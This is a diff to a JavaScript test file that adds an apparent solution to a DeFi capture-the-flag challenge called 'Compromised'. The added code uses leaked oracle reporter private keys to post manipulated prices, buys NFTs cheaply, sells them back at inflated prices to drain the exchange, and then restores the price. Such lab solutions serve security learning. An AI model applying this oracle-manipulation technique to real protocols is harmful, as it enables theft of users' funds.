@@ -64,6 +64,46 @@ describe("Compromised challenge", function () {
 
     it("Exploit", async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        const key1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9"
+        const key2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"
+        const reporter1 = new ethers.Wallet(key1, ethers.provider)
+        const reporter2 = new ethers.Wallet(key2, ethers.provider)
+        const tokenSymbol = await this.nftToken.symbol()
+
+        for (let i = 0; i < 11; i++) {
+            // current price is 999eth
+            // inject 0 and 0.0001 as price, so the median price will be 0.0001 (exchange doesn't allow zero price)
+            await this.oracle.connect(reporter1).postPrice(tokenSymbol, 0)
+            await this.oracle
+                .connect(reporter2)
+                .postPrice(tokenSymbol, ethers.utils.parseEther("0.01"))
+            await this.exchange.connect(attacker).buyOne({ value: ethers.utils.parseEther("0.01") })
+
+            // shortcut of tokenID since we're the only user
+            const tokenID = i
+
+            // current price is 0.01
+            // inject 0 and 2000 as price, so the median price will be 999
+            // the 11th round should manipulate the price to 1eth to drain extra eth
+            await this.oracle.connect(reporter1).postPrice(tokenSymbol, 0)
+            if (i === 10) {
+                await this.oracle
+                    .connect(reporter2)
+                    .postPrice(tokenSymbol, ethers.utils.parseEther("0.11"))
+            } else {
+                await this.oracle
+                    .connect(reporter2)
+                    .postPrice(tokenSymbol, ethers.utils.parseEther("2000"))
+            }
+            // approve exchange and sell
+            await this.nftToken.connect(attacker).approve(this.exchange.address, tokenID)
+            await this.exchange.connect(attacker).sellOne(tokenID)
+        }
+
+        // recover the original price
+        await this.oracle.connect(reporter1).postPrice(tokenSymbol, 0)
+        await this.oracle.connect(reporter2).postPrice(tokenSymbol, ethers.utils.parseEther("2000"))
     })
 
     after(async function () {
